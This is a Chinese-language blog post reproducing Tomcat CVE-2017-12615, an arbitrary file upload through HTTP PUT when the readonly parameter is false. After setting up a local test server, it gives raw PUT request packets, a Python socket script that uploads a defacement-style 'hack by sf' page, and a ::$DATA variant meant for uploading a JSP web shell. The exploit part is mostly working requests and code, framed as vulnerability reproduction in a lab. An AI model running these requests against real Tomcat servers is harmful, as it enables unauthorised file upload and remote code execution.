# Tomcat CVE-2017-12615 远程上传漏洞复现 - admin-神风 - 博客园

> 原文：[`www.cnblogs.com/wh4am1/p/7623774.html`](https://www.cnblogs.com/wh4am1/p/7623774.html)

漏洞名称：CVE-2017-12615-远程代码执行漏洞

**CVE-2017-12615：远程代码执行漏洞**

当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP 文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。

通过以上两个漏洞可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。

影响范围： Apache Tomcat 7.0.0 - 7.0.81

首先在 Tomcat 官网下载 7.0.81 版本

下载链接：[`mirrors.shuosc.org/apache/tomcat/tomcat-7/v7.0.81/bin/apache-tomcat-7.0.81.tar.gz`](http://mirrors.shuosc.org/apache/tomcat/tomcat-7/v7.0.81/bin/apache-tomcat-7.0.81.tar.gz)

在 Linux 上搭建 把 apache-tomcat-7.0.81.tar.gz 文件解压后放到/usr/local/目录下 [](http://mirrors.shuosc.org/apache/tomcat/tomcat-7/v7.0.81/bin/apache-tomcat-7.0.81.tar.gz) 

![](img/00d742e2fd0ed4cdbcc643b3565a23cb.png)

在终端里进入 bin 目录，并输入./startup.sh 开启 tomcat

![](img/0541878f8e94b2a976f801d90f106df2.png)

随后访问 http://192.168.149.129:8080 端口就可以访问到

![](img/0807265662efe86ef6f2c24212742a41.png)

**漏洞利用步骤**

在/conf/目录下有个 web.xml 文件  打开添加 readonly 参数，属性值为 false

![](img/68eec7e5c62ccbe5b98035bb48c757f7.png)

然后往目标服务器发送 put 数据包

```
PUT /123.html/ HTTP/1.1  
Host: 192.168.149.129:8080  
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
DNT:1
Connection: close
Content-Length: 664 <html>
<head>
<title>hack by sf</title>
</head>
<body> hack by sf! </body>
</html>
```

该数据包是在目标的根目录下生成一个 123.html 文件

这里我们用 Python 写了个利用脚本

代码如下

```
import socket

poc = "<html><head><title>hack by sf</title></head><body>hack by sf!</body></html>";
buffer = ( "PUT /123.html/ HTTP/1.1\r\n""Host: 192.168.149.129:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"DNT:1\r\n"
"Connection: close\r\n"
"Content-Length: 664\r\n\r\n"+poc)

expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
expl.connect(("192.168.149.129",8080));   
expl.send(buffer);
expl.close(); 
```

运行后：

![](img/865e0f2ba623be8d8846870d689d64e2.png)

修改 123.html 的后缀可以达到上传任意文件。

再贴上 Tomcat 7.0.79 的 poc：

```
PUT /aedoo.jsp::$DATA HTTP/1.1 Host: 192.168.1.1:8080 Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8 Cookie: 
Connection: close
Content-Length: 22 your jsp ma
```